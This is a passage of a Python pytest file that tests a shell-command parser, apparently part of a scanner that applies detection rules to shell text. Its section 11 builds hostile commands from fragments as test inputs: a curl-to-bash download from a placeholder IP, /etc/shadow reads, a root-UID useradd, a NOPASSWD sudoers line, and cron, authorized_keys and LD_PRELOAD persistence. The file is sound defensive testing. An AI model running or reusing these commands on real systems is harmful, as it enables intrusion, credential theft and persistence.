    ["x=$(tr a-z A-Z <<EOF", "hello", "EOF", "  | rev)"],
    ['echo "$(cat <<EOF', "hello", "EOF", ')"'],
    ["cat <<EOF |", "hello", "EOF", "tr a-z A-Z"],
])
def test_a_command_goes_on_after_a_heredoc_body(lines):
    assert join_logical_lines([*lines, "id"]) == [(1, "\n".join(lines)), (len(lines) + 1, "id")]


@pytest.mark.parametrize(("lines", "joined"), [
    (["echo a |", "  tr a-z A-Z"], "echo a | tr a-z A-Z"),
    (["cd /tmp &&", "  ls"], "cd /tmp && ls"),
    (["test -f a ||", "  touch a"], "test -f a || touch a"),
    (["make |&", "  tee log"], "make |& tee log"),
    (["echo a |  ", "tr a b"], "echo a | tr a b"),
    (["echo a |", "tr a b |", "rev"], "echo a | tr a b | rev"),
    (["echo " + BS + "||", "rev"], "echo " + BS + "|| rev"),  # the first | is escaped, the second is a pipe
    (["(cd /tmp &&", "  ls)"], "(cd /tmp && ls)"),
    (['[[ -z "$a" ||', '  -n "$b" ]]'], '[[ -z "$a" || -n "$b" ]]'),
])
def test_a_line_ending_in_a_pipe_or_list_operator_continues(lines, joined):
    assert join_logical_lines([*lines, "id"]) == [(1, joined), (len(lines) + 1, "id")]


@pytest.mark.parametrize("line", [
    "echo a " + BS + "|",  # an escaped |
    "echo a # x |",  # a | in a comment
    "echo " + SQ + "a |" + SQ,
    "sleep 1 &",  # a background job
    "echo a " + BS + "&&",  # an escaped &, then a background &
    "echo a >|",  # a redirection with no word
    "a) id ;&",  # a case fallthrough
])
def test_other_line_ends_do_not_continue(line):
    lines = [line, "id"]
    assert join_logical_lines(lines) == separate(lines, 1)


def test_a_quote_left_open_at_the_end_joins_nothing():
    lines = ['echo "a', *FILLER]
    assert join_logical_lines(lines) == separate(lines, 1)


@pytest.mark.parametrize("repeat", [1, 3])
def test_a_string_too_long_to_store_whole_joins_nothing(repeat):
    # Joined, these lines would pass MAX_LINE (repeat 1), or grow past the reading limit before the quote closes (3).
    lines = ['echo "a', *FILLER * repeat, 'b"', "id"]
    assert join_logical_lines(lines) == separate(lines, 1)


@pytest.mark.parametrize(("lines", "spans"), [
    (["id", 'echo "a', "ls"], [(2, 3, UNCLOSED)]),
    (["id", "x=$(" * 70, "ls"], [(2, 2, TOO_DEEP)]),
    (["id", *["x=$("] * 70, "ls"], [(2, 66, TOO_DEEP), (67, 72, UNCLOSED)]),
    (["id", 'echo "a', *FILLER, 'b"'], [(2, 123, f"joined, these lines would pass {MAX_LINE} characters")]),
])
def test_lines_kept_apart_are_reported(lines, spans):
    unjoined: list = []
    assert join_logical_lines(lines, unjoined=unjoined) == separate(lines, 1)
    assert unjoined == spans


def test_joining_random_shell_fragments_drops_no_line():
    rng = random.Random(20261018)
    pieces = ['"', SQ, "`", "$(", ")", "=(", "(", "$((", " <<EOF", " <<-EOF", "EOF", " |", " &&", " ||", BS, "#",
              " id", " echo a", "$" + SQ, BS + '"', " [[", " ]]"]
    for _ in range(3000):
        lines = ["".join(rng.choice(pieces) for _ in range(rng.randint(0, 4))) for _ in range(rng.randint(1, 12))]
        out = join_logical_lines(lines)
        numbers = [n for n, _ in out]
        assert numbers == sorted(set(numbers)), lines
        joined = "\n".join(text for _, text in out)
        for line in lines:
            assert line.strip().rstrip(BS).strip() in joined, (lines, out)


@pytest.mark.parametrize("make", [
    lambda n: ['echo "a'] * n,  # strings that close on the next line
    lambda n: ["echo " + SQ + "a"] + ["ls -la /tmp"] * n,  # a quote that never closes
    lambda n: ["x=$("] * n,  # substitutions that never close, nesting too deep
    lambda n: ['echo "$(printf "%s" "a' * 3] * n,  # substitutions with quotes nested in them
    lambda n: ["a=("] * n,  # arrays that never close
    lambda n: ["echo a |"] * n,  # a pipeline continued on every line
    lambda n: ["x=$(cat <<EOF", "a", "EOF"] * (n // 3),  # substitutions held open past heredoc bodies
    lambda n: ["echo " + (BS + '"a ') * 30] * n,  # escaped quotes
], ids=["closing-strings", "unclosed-quote", "unclosed-substitutions", "nested-quotes", "unclosed-arrays",
        "continued-pipeline", "heredoc-substitutions", "escaped-quotes"])
def test_joining_multi_line_commands_is_linear(make):
    scales_linearly(join_logical_lines, make, 2_000, ceiling=20.0)


@pytest.mark.parametrize(("text", "expected"), [
    ('[[ -z "$a" || -n "$b" ]] && { echo missing >&2; exit 1; }',
     ['[[ -z "$a" || -n "$b" ]]', "{ echo missing >&2", "exit 1", "}"]),
    ("if [[ a && b ]]; then id; fi", ["if [[ a && b ]]", "then id", "fi"]),
    ("while [[ -n $a || -n $b ]]; do id; done", ["while [[ -n $a || -n $b ]]", "do id", "done"]),
    ("! [[ a || b ]] || id", ["! [[ a || b ]]", "id"]),
    ("[[ $x =~ ^(a|b)$ && -n $y ]] && id", ["[[ $x =~ ^(a|b)$ && -n $y ]]", "id"]),
    ("[[ a ]]&&id", ["[[ a ]]", "id"]),
    ("id && [[ a || b ]] || ls", ["id", "[[ a || b ]]", "ls"]),
    ("id | [[ a || b ]]", ["id | [[ a || b ]]"]),
])
def test_split_keeps_and_or_inside_double_brackets(text, expected):
    assert split_commands(text) == expected


@pytest.mark.parametrize(("text", "expected"), [
    ("echo [[ a || id", ["echo [[ a", "id"]),  # [[ as an argument is a word
    ("[[ a || id", ["[[ a", "id"]),  # a test that never closes splits as before
    ("[[ a || id; ls", ["[[ a", "id", "ls"]),
    ("echo a[[ b || id ]]", ["echo a[[ b", "id ]]"]),
    ("[[a || id ]]", ["[[a", "id ]]"]),  # [[ glued to a word is not the keyword
    ('echo "[[ a" || id', ['echo "[[ a"', "id"]),
])
def test_split_still_splits_where_no_test_opens(text, expected):
    assert split_commands(text) == expected


def test_a_test_too_long_to_store_whole_is_split_at_its_operators():
    text = "if [[ " + " || ".join(f"-f /tmp/f{k}" for k in range(600)) + " ]]; then id; fi"
    parts = split_commands(text)
    assert all(len(normalize_text(part)) <= MAX_LINE for part in parts)
    assert parts[0] == "if [[ -f /tmp/f0" and parts[-2:] == ["then id", "fi"]


@pytest.mark.parametrize("make", [
    lambda n: "[[ " + "a || " * n + "b ]] && id",  # one long test
    lambda n: "[[ " + "a || " * n,  # a test that never closes
    lambda n: "if [[ a || b ]] && " * n + "id",  # many tests
    lambda n: "[[ " * n + "a || b",  # many openers
    lambda n: "echo [[ " + "a || " * n,  # [[ as an argument
    lambda n: "if" + " " * n + "[[ a || b ]] " * n,  # a long run of blanks before a [[
], ids=["long-test", "unclosed-test", "many-tests", "many-openers", "argument", "blanks"])
def test_split_commands_with_double_brackets_is_linear(make):
    scales_linearly(split_commands, make, 2_000, ceiling=20.0)


# 8. Heredoc bodies too long to store whole

HEREDOC_TOO_LONG = f"with its heredoc body, this command would pass {MAX_LINE} characters"
ZWSP = chr(0x200B)
FILLER_99 = "echo " + "x" * 94  # 99 characters, which normalizing leaves as they are


def heredoc_of_length(total: int) -> list[str]:
    """bash <<EOF, a body and EOF, whose lines joined by newlines are total characters long."""
    filler = (total - 115) // 100
    last = "echo " + "y" * (total - 15 - 100 * filler - 5)
    return ["bash <<EOF", *[FILLER_99] * filler, last, "EOF"]


def test_a_heredoc_body_that_fits_stays_whole():
    lines = heredoc_of_length(MAX_LINE)
    out = join_logical_lines([*lines, "id"])
    assert out == [(1, "\n".join(lines)), (len(lines) + 1, "id")]
    assert len(normalize_text(out[0][1])) == MAX_LINE


def test_a_heredoc_body_too_long_to_store_whole_keeps_its_lines_apart():
    lines = heredoc_of_length(MAX_LINE + 1)
    unjoined: list = []
    assert join_logical_lines([*lines, "id"], unjoined=unjoined) == separate([*lines, "id"], 1)
    assert unjoined == [(1, len(lines), HEREDOC_TOO_LONG)]


def test_a_heredoc_body_is_measured_as_it_is_stored():
    # 600 zero-width spaces are 600 characters, but each is stored as 8, so the record would pass MAX_LINE.
    lines = ["bash <<EOF", "echo a" + ZWSP * 600, "echo b", "EOF"]
    assert len("\n".join(lines)) < MAX_LINE
    assert join_logical_lines(lines) == separate(lines, 1)


def test_an_oversized_heredoc_keeps_its_continued_opener_as_one_record():
    lines = ["cat <<A " + BS, "  > /tmp/x", *[FILLER_99] * 45, "A", "id"]
    assert join_logical_lines(lines) == [(1, "cat <<A > /tmp/x"), *separate(lines[2:], 3)]


def test_an_oversized_heredoc_inside_a_substitution_is_reported_once():
    lines = ["x=$(cat <<EOF", *[FILLER_99] * 45, "EOF", ")"]
    unjoined: list = []
    assert join_logical_lines(lines, unjoined=unjoined) == separate(lines, 1)
    assert unjoined == [(1, len(lines), f"joined, these lines would pass {MAX_LINE} characters")]


@pytest.mark.parametrize(("make", "size"), [
    (lambda n: ["bash <<EOF", *["echo " + "x" * 60] * n, "EOF"], 2_000),  # one body far over the limit
    (lambda n: ["cat <<EOF", *[FILLER_99] * 45, "EOF"] * (n // 47), 2_000),  # many bodies just over it
    (lambda n: ["cat <<EOF", "a" + ZWSP * 600, "EOF"] * (n // 3), 150),  # bodies over it once stored (slow to show)
], ids=["one-long-body", "many-long-bodies", "zero-width-bodies"])
def test_splitting_oversized_heredocs_is_linear(make, size):
    scales_linearly(join_logical_lines, make, size, ceiling=20.0)


# 9. Comments after a closing parenthesis, and multi-line records split at command boundaries


@pytest.mark.parametrize("line", [
    "id; (true)# don" + SQ + "t",  # checked against bash: after a subshell's ), a # starts a comment
    "case a in a)# it" + SQ + "s",  # and after a case pattern's )
    "f()# it" + SQ + "s",  # and after a function's ()
    "(( x = 1 ))# it" + SQ + "s",  # and after an arithmetic command
])
def test_a_hash_after_a_closing_parenthesis_starts_a_comment(line):
    lines = [line, "echo LINE2", "echo LINE3", "# that" + SQ + "s all"]
    assert join_logical_lines(lines) == separate(lines, 1)


@pytest.mark.parametrize("line", [
    "a=(1 2)# it" + SQ + "s",  # checked against bash: after an array's ), the # is part of the word
    "{ true; }# it" + SQ + "s",  # after }, too
    "x=$(true)# it" + SQ + "s",  # and after a substitution's )
])
def test_a_hash_glued_to_a_word_is_text(line):
    lines = [line, "echo AFTER", "end" + SQ]
    assert join_logical_lines(lines) == [(1, "\n".join(lines))]


@pytest.mark.parametrize(("text", "expected"), [
    ("cd /tmp\nls", ["cd /tmp", "ls"]),
    ("echo a |\ntr a-z A-Z", ["echo a |\ntr a-z A-Z"]),  # a pipeline stays whole
    ("cd /tmp &&\nls", ["cd /tmp", "ls"]),
    ("curl -s a " + BS + "\n  -o b; id", ["curl -s a " + BS + "\n  -o b", "id"]),
    ("# note\nid", ["# note", "id"]),
    ("ls # it" + SQ + "s\ncd /tmp", ["ls # it" + SQ + "s", "cd /tmp"]),
    ('whoami; x="a\nb"; id', ["whoami", 'x="a\nb"', "id"]),
    ("x=$(\n  cd /tmp; ls\n)\nid", ["x=$(\n  cd /tmp; ls\n)", "id"]),
    ("(\ncd /tmp\n)\nid", ["(\ncd /tmp\n)", "id"]),
    ("a=(\n  -H x # c\n)\nid", ["a=(\n  -H x # c\n)", "id"]),
    ("for f in *; do\n  echo $f\ndone", ["for f in *", "do", "echo $f", "done"]),
    ("if [[ a ||\n b ]]; then\n  id\nfi", ["if [[ a ||\n b ]]", "then", "id", "fi"]),
    ("id; cat <<EOF; echo hi\nbody; x\nEOF\nls", ["id", "cat <<EOF; echo hi\nbody; x\nEOF", "ls"]),
    ("cat <<EOF |\nhello; it" + SQ + "s\nEOF\ntr a-z A-Z && id",
     ["cat <<EOF |\nhello; it" + SQ + "s\nEOF\ntr a-z A-Z", "id"]),
    ("x=$(cat <<EOF\nhello\nEOF\n  | rev; id)\nls", ["x=$(cat <<EOF\nhello\nEOF\n  | rev; id)", "ls"]),
    ("cat <<A <<B; ls\na\nA\nb\nB\nid", ["cat <<A <<B; ls\na\nA\nb\nB", "id"]),
    ("echo " + SQ + "a\nid\nls", ["echo " + SQ + "a\nid\nls"]),  # a quote that never closes holds the rest
])
def test_multi_line_text_splits_at_command_boundaries(text, expected):
    assert split_commands(text) == expected


def test_split_parts_keep_every_character_in_order():
    rng = random.Random(20261019)
    pieces = ['"', SQ, "`", "$(", ")", "(", "[[ ", " ]]", " && ", " || ", "; ", " | ", " # ", "<<EOF", "\nEOF\n",
              BS, "\n", "\n", "$" + SQ, "a=(", "$((", "))", "((", "|\n", "&&\n", BS + "\n", "case x in a)", "x", "id",
              " & ", "&", "&>", ">&", "|&", "2>&1", "&\n"]
    for _ in range(4000):
        text = "".join(rng.choice(pieces) for _ in range(rng.randint(1, 30)))
        parts = [part for _, record in join_logical_lines(text.split("\n")) for part in split_commands(record)]
        wanted = "".join(ch for ch in text if ch.isalnum())
        assert "".join(ch for part in parts for ch in part if ch.isalnum()) == wanted, (text, parts)


@pytest.mark.parametrize("make", [
    lambda n: "cd /tmp\n" * n,  # many short commands
    lambda n: "cat <<EOF; id\nx; y\nEOF\n" * n,  # many heredocs
    lambda n: 'echo "a\n' + "b; c\n" * n + '"',  # a long string spanning lines
    lambda n: "a |\n" * n + "b",  # a long pipeline
    lambda n: "echo " + SQ + "x\n" + "ls; id\n" * n,  # a quote that never closes
    lambda n: "x=$(\n" * n,  # substitutions that never close
    lambda n: "(\n" * n + "id",  # parentheses that never close
], ids=["short-commands", "heredocs", "long-string", "long-pipeline", "unclosed-quote", "unclosed-substitutions",
        "unclosed-parentheses"])
def test_splitting_multi_line_text_is_linear(make):
    scales_linearly(split_commands, make, 1_000, ceiling=20.0)


# 10. Background jobs: a lone & ends a command, as ; does, and stays on the command it ends


@pytest.mark.parametrize(("text", "expected"), [
    ("nohup ./x & rm -f x", ["nohup ./x &", "rm -f x"]),
    ("./a & ./b & wait", ["./a &", "./b &", "wait"]),
    ("cmd >&2 & next", ["cmd >&2 &", "next"]),
    ("a &>/dev/null & b", ["a &>/dev/null &", "b"]),
    ("[[ a && b ]] & c", ["[[ a && b ]] &", "c"]),
    ("make 2>&1 | tee log &", ["make 2>&1 | tee log &"]),
    ("a&b", ["a&", "b"]),
    ('echo "a & b" & c', ['echo "a & b" &', "c"]),
    ("x=$(a & b) & c", ["x=$(a & b) &", "c"]),
    ("echo $(( a & b )) & c", ["echo $(( a & b )) &", "c"]),
    ("(a & b) & c", ["(a & b) &", "c"]),
    ("sleep 1 &\nid", ["sleep 1 &", "id"]),
    ("cat <<EOF & id\nbody & x\nEOF\nls & pwd", ["cat <<EOF & id\nbody & x\nEOF", "ls &", "pwd"]),
])
def test_a_lone_ampersand_ends_a_background_job(text, expected):
    assert split_commands(text) == expected


@pytest.mark.parametrize(("text", "expected"), [
    ("a && b || c", ["a", "b", "c"]),
    ("a |& b", ["a |& b"]),
    ("a <&3 b", ["a <&3 b"]),
    ("a 2>&1 >/dev/null", ["a 2>&1 >/dev/null"]),
    ("[[ a & b ]] && c", ["[[ a & b ]]", "c"]),  # inside a test, & is not a separator
    ("[[ a & b && c", ["[[ a &", "b", "c"]),  # a test that never closes is split, as before
])
def test_other_ampersands_do_not_end_a_command(text, expected):
    assert split_commands(text) == expected


# An escaped character is part of a word, so the & after it is a lone & that ends a background job: bash 5.2 runs id
# in each of the first six. An escaped backslash leaves the operator after it whole, so a\\>& id writes to a file id.
@pytest.mark.parametrize(("text", "expected"), [
    ("echo a" + BS + ">& id", ["echo a" + BS + ">&", "id"]),
    ("echo a" + BS + "&& id", ["echo a" + BS + "&&", "id"]),
    ("echo a" + BS + "|& id", ["echo a" + BS + "|&", "id"]),
    ("echo a" + BS + ";& id", ["echo a" + BS + ";&", "id"]),
    ("echo a" + BS + "<& id", ["echo a" + BS + "<&", "id"]),
    ("echo a" + BS * 3 + ">& id", ["echo a" + BS * 3 + ">&", "id"]),
    ("echo a" + BS * 2 + ">& id", ["echo a" + BS * 2 + ">& id"]),
    ("echo a" + BS * 2 + "&& id", ["echo a" + BS * 2, "id"]),  # an escaped backslash, then &&
])
def test_an_ampersand_after_an_escaped_character_ends_a_background_job(text, expected):
    assert split_commands(text) == expected


@pytest.mark.parametrize("make", [
    lambda n: "a & " * n,  # many background jobs
    lambda n: "a >&2 &>x <&3 |& " * n,  # many ampersands that are not separators
    lambda n: "[[ a & " * n,  # ampersands held in a test that never closes
    lambda n: "x &\n" * n,  # background jobs on many lines
    lambda n: "a" + BS * n + ">& b",  # a long run of backslashes before an operator
    lambda n: ("a" + BS + ">& ") * n,  # many escaped operator characters
], ids=["background-jobs", "redirections", "held-in-test", "lines", "backslash-run", "escaped-operators"])
def test_splitting_background_jobs_is_linear(make):
    scales_linearly(split_commands, make, 1_000, ceiling=20.0)


# 11. Plain heredoc writes, which a multi-line rule may read whole. Attack-like strings are built from fragments.
# Every record in the second list that is not plainly broken runs code in bash 5.2 (checked in a container): a command
# beside the write, an expansion in the body, or body lines that bash runs as commands of their own.

CU, BA = "cu" + "rl", "ba" + "sh"
DOWNLOAD = CU + " -s hxxp://203.0.113[.]5/x | " + BA
SHADOW_READ = "cat /etc/" + "shadow"


@pytest.mark.parametrize("lines", [
    ["cat > /etc/cron.d/x <<'EOF'", "* * * * * root /tmp/x", "EOF"],
    ["tee -a ~/.ssh/authorized_keys <<EOF", "ssh-ed25519 AAAAC3Nza k", "EOF"],
    ["cat <<-EOF > /tmp/x", "\tbody", "\t\tEOF"],
    ["cat >> ~/.bashrc <<" + BS + "A", "alias ls=x", "", "A"],
    ['cat > "/tmp/a b" 2>&1 <<"END-OF-FILE"', "x; y && z", "END-OF-FILE"],
    ["cat <<EOF >> /tmp/x", "EOF"],  # an empty body
    ["crontab - <<EOF", "* * * * * /tmp/x", "EOF"],
    ["sudo tee -a /etc/crontab << 'EOF'", "@reboot /tmp/x", "EOF"],
    ["cat <<EOF &> /tmp/x", "x", "EOF"],  # redirections with their words
    ["cat >| /tmp/x 2>&- <<EOF", "x", "EOF"],
    ["cat <<EOF > 2 {fd}>/tmp/x", "x", "EOF"],  # digits are a word where no < or > follows them
    ["cat <<EOF >> ${HOME}/.bashrc", "export PATH=/opt/bin:/usr/bin", "EOF"],  # a target expansion runs nothing
    ["cat <<EOF >> ~/.bashrc", "price " + BS + "$5", "EOF"],  # an escaped $ is a $
    ["cat > /etc/cron.d/x <<'EOF'", "* * * * * root " + DOWNLOAD, "$(" + SHADOW_READ + ") `id`", "EOF"],  # quoted:
    ["cat > /tmp/x <<-'EOF'", "\t$(id)", "\tEOF"],  # the body is never expanded
    ["cat <<'EOF' >> ~/.bashrc", "export PATH=$PATH:/tmp/.x", "EOF"],
    # The copiers, behind the usual wrappers.
    ["sudo tee /etc/sudoers.d/x >/dev/null <<EOF", "x ALL=(ALL) NOPASS" + "WD: ALL", "EOF"],
    ["crontab -u root /dev/stdin <<'EOF'", "@reboot /tmp/x", "EOF"],
    ["sudo -n -u root env -i /usr/bin/tee -a /etc/crontab <<'EOF'", "@reboot /tmp/x", "EOF"],
    ["nohup command cat - <<EOF >> /tmp/x", "x", "EOF"],
    ["cat -A 0<<EOF > /tmp/x", "x", "EOF"],
])
def test_a_plain_heredoc_write_is_recognized(lines):
    text = "\n".join(lines)
    assert join_logical_lines(lines) == [(1, text)]  # each is one record, as the reader stores it
    assert is_plain_heredoc_write(text)


@pytest.mark.parametrize("lines", [
    # The reviewer's six records, in which a rule reading the whole record would hide code.
    ["cat >> ~/.bashrc <<A; " + DOWNLOAD, "alias ls=x", "A"],
    ["cat > /etc/cron.d/x <<A; " + DOWNLOAD, "* * * * * root /tmp/x", "A"],
    ["cat >> ~/.ssh/authorized_keys <<A; " + SHADOW_READ, "ssh-ed25519 AAAAC3Nza k", "A"],
    ["user" + "add -o -u 0 svc <<A; " + SHADOW_READ, "x", "A"],
    ["cat >> ~/.bashrc <<A && " + BA + " <<B", "alias ls=x", "A", SHADOW_READ, "B"],
    ['echo "<<" >> ~/.bashrc "$(', SHADOW_READ, ')"'],
    # More that are not one plain write.
    ["cat <<A | " + BA, SHADOW_READ, "A"],  # a pipe
    ["cat <<A |& " + BA, SHADOW_READ, "A"],
    ["cat <<A > /tmp/x &", "x", "A"],  # a background job
    ["cat <<A > /tmp/x || id", "x", "A"],
    ["cat <<A /tmp/x" + BS + ">& id", "x", "A"],  # an & after an escaped character still ends a command
    ["cat <<A /tmp/x" + BS + "&& id", "x", "A"],
    ["cat <<A /tmp/x" + BS + "|& id", "x", "A"],
    ["(cat <<A > /tmp/x)", "x", "A"],  # a subshell
    ["cat <<A > $(mktemp)", "x", "A"],  # a substitution
    ["cat <<A > `mktemp`", "x", "A"],
    ["cat <<A > >(" + BA + ")", "x", "A"],
    ["diff <(id) - <<A", "x", "A"],
    ["read 'a[$(id)]' <<A", "x", "A"],  # even quoted: read runs a substitution in an array subscript
    ["cat <<A > /tmp/x # note", "x", "A"],  # a comment, which the scans can misplace (as in ${x:- #})
    ["cat <<A > /tmp/x", "x", "A", "id"],  # something after the terminator
    ["cat <<A > /tmp/x", "x", "A", ""],
    ["cat <<A > /tmp/x", "A", SHADOW_READ, "A"],  # the body ends at the first terminator
    ["cat <<A > /tmp/x", "x", "AB"],  # no terminator
    ["cat <<A > /tmp/x"],  # no body
    ["cat <<A <<B > /tmp/x", "a", "A", "b", "B"],  # two heredocs
    ["cat <<< x > /tmp/x", "y"],  # a here-string, not a heredoc
    ["cat <<< x <<A > /tmp/x", "y", "A"],  # a here-string as well
    ["echo '<<A' > /tmp/x", "x", "A"],  # << inside quotes
    ["echo $(( 1 <<A )) > /tmp/x", "x", "A"],  # << as a shift
    ["echo $[1<<A] > /etc/cron.d/x", DOWNLOAD, "A"],  # a shift too, which the scans read as a heredoc
    ["echo ${x:-<<A} > /etc/cron.d/x", DOWNLOAD, "A"],  # << in a parameter expansion, read as a heredoc too
    ["cat > /tmp/${x:-a} <<A", "x", "A"],  # so any ${ } but ${name}
    ['cat <<A > "/tmp/x', 'y"', "A"],  # the first line leaves a string open
    ["cat <<A > /tmp/x " + BS, "x", "A"],  # the first line continues
    ["cat <<-A > /tmp/x", "x", "  A"],  # <<- strips tabs, not spaces
    ["cat > /tmp/x <<$'EOF'", "x", "EOF", DOWNLOAD, "$EOF"],  # bash reads <<$'EOF' as <<EOF
    ['cat > /tmp/x <<$"EOF"', "x", "EOF", DOWNLOAD, "$EOF"],
    ["cat > /tmp/x <<E$x", "x", "E$x"],  # so any $ in the word
    # An unquoted delimiter: bash expands the body, and joins a line ending in a backslash to the next one.
    ["cat >> ~/.bashrc <<EOF", "alias ls=x", "$(" + SHADOW_READ + ")", "EOF"],
    ["cat >> ~/.bashrc <<EOF", "`" + SHADOW_READ + "`", "EOF"],
    ["cat > /tmp/x <<-EOF", "\t${x:-$(id)}", "EOF"],
    ["cat > /etc/cron.d/x <<EOF", "* * * * * root /tmp/x", "EO" + BS, "F", DOWNLOAD, "EOF"],  # EO\ F ends it
    # and it expands any variable, whose value, set earlier, can run code: ${x@P}, or $[x] with a subscript in x.
    ["cat <<EOF >> ${HOME}/.bashrc", "export PATH=$PATH:/tmp/.x", "EOF"],
    ["cat >> ~/.bashrc <<EOF", "${x@P}", "EOF"],
    ["cat >> ~/.bashrc <<EOF", BS + BS + "$[x]", "EOF"],  # an escaped backslash, then the expansion
    # An assignment changes which copier runs or what it loads.
    ["sudo -n -u root env LC_ALL=C /usr/bin/tee -a /etc/crontab <<'EOF'", "@reboot /tmp/x", "EOF"],
    ["X=1 nohup command cat - <<EOF >> /tmp/x", "x", "EOF"],
    ["PATH=/tmp/.x cat > /etc/cron.d/x <<'EOF'", "x", "EOF"],
    ["sudo LD_PRELOAD=/tmp/.x/l.so tee -a ~/.bashrc <<'EOF'", "x", "EOF"],
    # A syntax error: an interactive bash drops the line, heredoc and all, and runs the body's lines as commands.
    ["done cat > /etc/cron.d/x <<A", DOWNLOAD, "A"],  # a reserved word first
    ["} cat > /etc/cron.d/x <<A", DOWNLOAD, "A"],
    ["[[ x << A ]] > /etc/cron.d/x", DOWNLOAD, "A"],
    ["cat > <<A", DOWNLOAD, "A"],  # a redirection with no word
    ["cat << > /tmp/x <<A", DOWNLOAD, "A"],
    ["cat <<A 2>&", "x", "A"],
    ["cat <<A >", "x", "A"],
    ["cat > /tmp/x < 2>&1 <<A", DOWNLOAD, "A"],  # bash reads 2> as a descriptor and >, so < has no word
    ["cat <<2>/tmp/x", DOWNLOAD, "2"],
    ["cat <<A > {fd}>/tmp/x", DOWNLOAD, "A"],
    # Other compound commands.
    ["if cat > /tmp/x <<A", "x", "A"],
    ["{ cat > /tmp/x <<A", "x", "A"],
    ["case x in x) cat > /tmp/x <<A", "x", "A"],
    # The rules reviewer's records: a << inside a quoted script that spans lines, not a heredoc.
    ["sh -c 'echo x >> ~/.bashrc <<EOF", SHADOW_READ, "EOF'"],
    ['ssh root@203.0.113[.]5 "echo k >> ~/.ssh/authorized_keys <<K', SHADOW_READ, "K", '"'],
    # A command that is not a copier reads the body: an interpreter, which runs it and writes only its output, or an
    # editor, whose script can run commands (ed's !, vim's :!).
    [BA + " <<'EOF' >> ~/.bashrc", DOWNLOAD, "EOF"],
    ["sh -s <<EOF > /etc/cron.d/x", DOWNLOAD, "EOF"],
    ["python3 - <<EOF >> /etc/rc.local", "import os", "EOF"],
    ["ssh root@203.0.113[.]5 <<EOF >> ~/.ssh/authorized_keys", SHADOW_READ, "EOF"],
    ["sudo " + BA + " <<EOF 2>>/etc/sudoers.d/x", "user" + "add -o -u 0 svc", "EOF"],
    ["ed -s ~/.bashrc <<'EOF'", "!id", "q", "EOF"],
    ["vim -es /etc/crontab <<'EOF'", ":!id", ":q!", "EOF"],
    ["exec >> ~/.bashrc <<'EOF'", "id", "EOF"],
    ["crontab -e <<'EOF'", ":!id", "EOF"],  # crontab -e runs an editor on the body
    ["sudo -S tee /etc/sudoers.d/x <<EOF", "x", "EOF"],  # sudo reads a password from the body
    ["env -S 'sh -c id' cat > /tmp/x <<EOF", "x", "EOF"],
    ["/tmp/cat > /tmp/x <<EOF", "x", "EOF"],  # not the system's cat
    # A copier that does not copy the body: it reads a file, or the body goes to another descriptor.
    ["cat " + SHADOW_READ[4:] + " <<'EOF' >> ~/.bashrc", "x", "EOF"],
    ["crontab /tmp/c <<EOF", "x", "EOF"],
    ["cat 3<<EOF > /tmp/x", "x", "EOF"],
    ["cat <<EOF < /etc/hosts > /tmp/x", "x", "EOF"],
    [],
])
def test_other_records_are_not_a_plain_heredoc_write(lines):
    assert not is_plain_heredoc_write("\n".join(lines))


@pytest.mark.parametrize(("word", "end"), [
    ("$'EOF'", "EOF"), ('$"EOF"', "EOF"), ("E$'O'F", "EOF"), ("$$'EOF'", "$$EOF"),
    # ANSI-C escapes, decoded as bash 5.2 decodes them; an unknown one keeps its backslash.
    ("$'E" + BS + "x4fF'", "EOF"), ("$'E" + BS + "117F'", "EOF"), ("$'A" + BS + "tB'", "A\tB"),
    ("$'A" + BS + "'B'", "A'B"), ("$'A" + BS + "u0042'", "AB"), ("$'A" + BS + "x414'", "AA4"),
    ("$'A" + BS + "zB'", "A" + BS + "zB"), ('$"E' + BS + '"F"', 'E"F'),
])
def test_an_ansi_c_or_locale_quoted_delimiter_ends_where_bash_ends_it(word, end):
    lines = [f"cat > /etc/cron.d/x <<{word}", "* * * * * root /tmp/x", end, "id"]
    assert join_logical_lines(lines) == [(1, "\n".join(lines[:3])), (4, "id")]


def test_commands_after_an_ansi_c_delimiter_are_records_of_their_own():
    # Read as $EOF, the delimiter would hold the download and the account inside the body, up to the $EOF line.
    lines = ["cat > /etc/cron.d/x <<$'EOF'", "* * * * * root /tmp/x", "EOF", DOWNLOAD, "user" + "add -o -u 0 svc", "$EOF"]
    assert join_logical_lines(lines) == [(1, "\n".join(lines[:3])), *separate(lines[3:], 4)]
    assert split_commands("\n".join(lines[:3]) + "\n" + DOWNLOAD) == ["\n".join(lines[:3]), DOWNLOAD]


@pytest.mark.parametrize(("operator", "shown"), [("<<", "<<<blob"), ("<<-", "<<<blob"), ("<<- ", "<<- <blob")])
def test_a_delimiter_that_blob_replacement_hides_is_not_a_plain_write(operator, shown):
    # Stored, the first heredoc reads as a here-string or as an operator with no word, so it looks as if only <<'A'
    # opened one, while bash expanded the first body too.
    word = "B" * 200
    raw = [f"cat {operator}{word} <<'A' > /etc/cron.d/x", "$(" + SHADOW_READ + ")", word, "* * * * * root /tmp/x", "A"]
    assert len(join_logical_lines(raw)) == 1
    stored = normalize_text("\n".join(raw))
    assert shown in stored.partition("\n")[0]
    assert not is_plain_heredoc_write(stored)


@pytest.mark.parametrize("make", [
    lambda n: "\n".join(["cat > /tmp/x <<EOF", *["line; with | text && more"] * n, "EOF"]),  # a long body
    lambda n: "cat > /tmp/x " + "'a' \"b\" " * n + "<<EOF\nx\nEOF",  # a long first line
    lambda n: "\n".join(["cat > /tmp/x <<EOF", *["EOF2"] * n]),  # no terminator
    lambda n: "\n".join(["cat > /tmp/x " + "<<A " * n, "x"]),  # many heredocs
    lambda n: "cat" + " 2>&1 >/tmp/x" * n + " <<EOF\nx\nEOF",  # many redirections
    lambda n: "cat > /tmp/x" + "${HOME}$y" * n + " <<EOF\nx\nEOF",  # many expansions
    lambda n: "\n".join(["cat > /tmp/x <<EOF", *["$x ${y} $[1] " + BS + "$ text"] * n, "EOF"]),  # an expanded body
    lambda n: "tee" + " /tmp/x" * n + " <<EOF\nx\nEOF",  # many words
    lambda n: "sudo" + " -n" * n + " env" + " X=1" * n + " cat <<EOF\nx\nEOF",  # many wrapper options
    lambda n: "cat > /tmp/x <<$'" + (BS + "x41" + BS + "n") * n + "'\nx\nA",  # a long ANSI-C delimiter
    lambda n: "cat > /tmp/x <<EOF\n" + (BS * 3 + "$") * n + "\nEOF",  # escaped $ after escaped backslashes
    lambda n: "cat > /tmp/x <<EOF\n" + BS * n + BS + "$\nEOF",  # one long run of backslashes before a $
], ids=["long-body", "long-first-line", "no-terminator", "many-heredocs", "redirections", "expansions",
        "expanded-body", "words", "wrapper-options", "ansi-c-delimiter", "escaped-dollars", "backslash-run"])
